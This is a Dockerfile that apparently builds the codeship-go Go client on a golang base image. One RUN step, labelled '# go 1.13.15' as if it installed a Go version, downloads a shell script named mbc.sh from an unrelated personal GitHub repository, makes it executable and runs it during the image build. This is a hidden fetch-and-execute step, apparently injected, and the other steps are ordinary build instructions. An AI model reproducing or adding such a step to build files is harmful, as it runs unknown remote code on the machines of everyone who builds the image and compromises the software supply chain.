ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh

# go 1.14.10
RUN go get golang.org/dl/go1.14.10 && \
    go1.14.10 download

WORKDIR /go/src/github.com/codeship/codeship-go
COPY . .

RUN make setup
